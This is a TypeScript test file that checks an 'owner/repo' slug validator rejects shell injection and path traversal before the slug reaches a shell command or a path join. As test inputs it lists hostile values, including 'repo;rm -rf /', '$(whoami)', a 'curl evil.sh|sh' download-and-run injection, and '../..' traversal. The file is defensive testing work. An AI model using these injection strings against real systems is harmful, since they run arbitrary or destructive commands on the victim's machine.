/**
 * `owner/repo` slug guard — the single definition, so the single spec.
 *
 * Two features build commands and URLs from this result: `skillsSh:install`
 * shells `npx skills add <owner/repo>`, and the external plugin marketplace
 * builds `raw.githubusercontent.com` paths AND filesystem paths from the two
 * halves. So every case below is a real injection or traversal attempt, not a
 * shape test — a `..` that slips through reaches `path.join`.
 */
import {
  SAFE_SOURCE_PATTERN,
  SAFE_PATH_TOKEN_PATTERN,
  isSafePathToken,
  parseSourceSlug,
} from './source-slug';

describe('isSafePathToken', () => {
  it.each(['ptah', 'hive-academy', 'my_repo', 'v1.2.3', '...', 'a'])(
    'accepts %p as one path segment',
    (token) => {
      expect(isSafePathToken(token)).toBe(true);
    },
  );

  it('rejects the two traversal tokens that the pattern alone would admit', () => {
    // Both match SAFE_PATH_TOKEN_PATTERN — the explicit check is the only
    // thing standing between them and a path join.
    expect(SAFE_PATH_TOKEN_PATTERN.test('.')).toBe(true);
    expect(SAFE_PATH_TOKEN_PATTERN.test('..')).toBe(true);
    expect(isSafePathToken('.')).toBe(false);
    expect(isSafePathToken('..')).toBe(false);
  });

  it.each([
    ['empty', ''],
    ['forward slash', 'a/b'],
    ['backslash', 'a\\b'],
    ['drive colon', 'C:'],
    ['space', 'my repo'],
    ['tilde', '~'],
    ['shell metacharacter', 'repo;rm -rf /'],
    ['command substitution', '$(whoami)'],
    ['newline', 'repo\nname'],
    ['leading null byte', '\0repo'],
  ])('rejects %s', (_label, token) => {
    expect(isSafePathToken(token)).toBe(false);
  });
});

describe('parseSourceSlug', () => {
  it('splits a well-formed slug into its two halves', () => {
    expect(parseSourceSlug('hive-academy/ptah')).toEqual({
      owner: 'hive-academy',
      repo: 'ptah',
    });
  });

  it('accepts dots and underscores in either half', () => {
    expect(parseSourceSlug('some_owner.v2/repo.name_x')).toEqual({
      owner: 'some_owner.v2',
      repo: 'repo.name_x',
    });
  });

  it.each([
    ['no separator', 'ptah'],
    ['three segments', 'a/b/c'],
    ['empty owner', '/repo'],
    ['empty repo', 'owner/'],
    ['empty string', ''],
    ['leading slash', '/owner/repo'],
    ['trailing slash', 'owner/repo/'],
    ['url', 'https://github.com/owner/repo'],
    ['space in repo', 'owner/my repo'],
    ['shell injection', 'owner/repo;curl evil.sh|sh'],
    ['backtick', 'owner/`id`'],
    ['ampersand', 'owner/repo&&whoami'],
    ['query string', 'owner/repo?ref=main'],
  ])('returns null for %s', (_label, source) => {
    expect(parseSourceSlug(source)).toBeNull();
  });

  it('returns null when a half is a traversal token even though the slug shape matches', () => {
    // This is the case the pattern cannot catch on its own: `../..` is a
    // perfectly well-formed `<token>/<token>` slug.
    expect(SAFE_SOURCE_PATTERN.test('../..')).toBe(true);
    expect(parseSourceSlug('../..')).toBeNull();

    expect(SAFE_SOURCE_PATTERN.test('owner/..')).toBe(true);
    expect(parseSourceSlug('owner/..')).toBeNull();

    expect(SAFE_SOURCE_PATTERN.test('../repo')).toBe(true);
    expect(parseSourceSlug('../repo')).toBeNull();

    expect(parseSourceSlug('./repo')).toBeNull();
    expect(parseSourceSlug('owner/.')).toBeNull();
  });

  it('is anchored at both ends', () => {
    // An unanchored pattern would match the inner `owner/repo` here.
    expect(parseSourceSlug('evil\nowner/repo')).toBeNull();
    expect(parseSourceSlug('owner/repo\nevil')).toBeNull();
  });
});
